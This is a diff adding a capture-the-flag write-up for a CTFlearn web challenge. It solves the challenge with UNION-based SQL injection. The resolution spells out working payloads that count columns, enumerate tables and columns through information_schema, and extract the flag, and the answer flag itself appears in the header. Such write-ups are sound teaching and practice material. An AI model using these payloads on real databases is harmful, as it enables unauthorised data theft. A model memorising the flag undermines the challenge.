@@ -1,0 +1,22 @@
+== Inj3ction Time
+:ch_category: Web
+:ch_flag: abctf{uni0n_1s_4_gr34t_c0mm4nd}
+
+=== Input
+
+> I stumbled upon this website: http://web.ctflearn.com/web8/ and I think they have the flag in their somewhere. UNION might be a helpful command
+
+=== Resolution
+
+// Most of the following is based on https://www.acunetix.com/blog/articles/exploiting-sql-injection-example/
+
+1. Check that the field is vulnerable by setting the input to `1 OR 1=1` (shows multiple results)
+2. Determine how many colums are being selected by setting `1 GROUP BY 1` and increasing the value until an error occurs (breaks at 5 here => 4 columns in the select)
+3. Identify which columns are being displayed `1 UNION SELECT 1,2,3,4` (here 1, 2, and 3, the 4th column is not returned)
+4. Extract the list of tables in the database through one of the displayed fields: `1 UNION SELECT (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),2,3,4` (show the tables `w0w_y0u_f0und_m3` and `webeight`)
+5. Extract the list of columns in the `w0w_y0u_f0und_m3` table: `1 UNION SELECT (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database()),2,3,4` (shows the column `f0und_m3` among others) (adding ` AND table_name='w0w_y0u_f0und_m3'` fails for... reasons ?)
+6. Extract the flag with `1 UNION SELECT (SELECT group_concat(f0und_m3) FROM w0w_y0u_f0und_m3),2,3,4`
+
+=== Solution
+
+`{ch_flag}`
